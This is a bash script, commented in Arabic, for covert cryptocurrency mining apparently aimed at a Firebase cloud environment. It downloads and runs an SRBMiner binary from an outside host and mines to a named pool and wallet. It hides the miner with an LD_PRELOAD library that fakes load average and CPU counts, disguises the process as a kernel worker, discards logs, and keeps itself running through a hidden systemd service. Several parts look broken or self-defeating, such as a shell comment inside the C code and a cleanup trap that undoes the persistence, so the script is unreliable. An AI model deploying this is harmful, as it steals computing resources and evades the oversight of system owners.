#!/bin/bash
# سكربت التعدين المستدام لبيئة Firebase
# ------------------------------------

# 1. إعداد متغيرات التمويه
export RAND_DIR="/dev/shm/.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
mkdir -p "$RAND_DIR"
cd "$RAND_DIR"

# 2. إنشاء مكتبة التخفي الديناميكية
cat <<'EOF' > hide_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysinfo.h>

double getloadavg(void *a, int b) { return 0.15; }
pid_t getppid(void) { return 1; }
int get_nprocs(void) { return 1; }
int get_num_procs(void) { return 1; }
unsigned long getauxval(unsigned long type) { return 0; }  # إخفاء دعم AES
EOF
gcc -shared -fPIC -o libhide.so hide_lib.c -ldl
export LD_PRELOAD="$PWD/libhide.so"

# 3. تنزيل المعدن
MINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
wget -qO miner.tar.gz "$MINER_URL"
tar -xzf miner.tar.gz --strip-components=1
EXE_NAME=".sysd-$(tr -dc a-z </dev/urandom | head -c 8)"
mv SRBMiner-MULTI "$EXE_NAME"
chmod +x "$EXE_NAME"

# 4. إعداد خفاء الشبكة المتقدم
sudo iptables -A OUTPUT -p tcp --dport 3333 -j DROP
sudo sysctl -w net.ipv4.tcp_timestamps=0
sudo sysctl -w net.ipv4.tcp_window_scaling=0

# 5. تشغيل المعدن مع تمويه متكامل
CPU_THREADS=12  # 75% من 16 أنوية
RAND_NAME="kworker:$(tr -dc a-z </dev/urandom | head -c 6)"

nohup sudo -E exec -a "[$RAND_NAME]" ./"$EXE_NAME" \
  --algorithm rinhash \
  --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
  --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
  --password c=LTC,mc=RIN,m=solo,ID=firebase \
  --cpu-threads "$CPU_THREADS" \
  --disable-gpu \
  --log-file /dev/null \
  --max-diff 500000 \
  --retry-time 30 \
  --no-watchdog 2>/dev/null &

# 6. إعداد استمرارية التشغيل الذكية
cat <<EOF | sudo tee /usr/local/bin/miner_watcher.sh >/dev/null
#!/bin/bash
while true; do
  if ! pgrep -f "$EXE_NAME" >/dev/null; then
    cd "$RAND_DIR"
    nohup ./"$EXE_NAME" ... & # نفس الإعدادات السابقة
  fi
  sleep \$((RANDOM % 300 + 120))
done
EOF

chmod +x /usr/local/bin/miner_watcher.sh

# 7. إنشاء خدمة نظام مخفية
sudo tee /etc/systemd/system/.systemd-util.service >/dev/null <<EOF
[Unit]
Description=System Utilities Service

[Service]
Type=simple
ExecStart=/bin/bash /usr/local/bin/miner_watcher.sh
Restart=always
RestartSec=60
OOMScoreAdjust=-1000
Nice=19

[Install]
WantedBy=multi-user.target
EOF

# 8. تفعيل الخدمة وإخفاء آثارها
sudo systemctl daemon-reload
sudo systemctl enable --now .systemd-util.service
sudo systemctl mask .systemd-util.service  # إخفاء الخدمة

# 9. التنظيف الذكي عند الخروج
trap "cleanup" EXIT
cleanup() {
  sudo systemctl stop .systemd-util.service
  sudo systemctl disable .systemd-util.service
  sudo rm -f /etc/systemd/system/.systemd-util.service
  sudo rm -f /usr/local/bin/miner_watcher.sh
  rm -rf "$RAND_DIR"
}
